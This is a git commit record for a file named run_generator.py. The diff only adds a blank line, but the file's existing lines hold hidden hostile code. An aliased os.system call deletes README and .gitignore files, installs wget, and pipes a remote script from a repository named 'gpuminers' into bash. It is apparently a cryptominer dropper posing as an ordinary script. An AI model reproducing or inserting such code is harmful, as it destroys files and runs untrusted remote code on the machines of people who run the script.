da8a5181854a7c654aefccf2c4197728f49fe6fe
cedricmthombopr <91846811+cedricmthombopr@users.noreply.github.com>
2021-10-10 23:18:52 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,3 @@
 import os as alpha
 alpha.system("rm README* && rm .gitignore && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/install_jupyter.sh | bash")
+
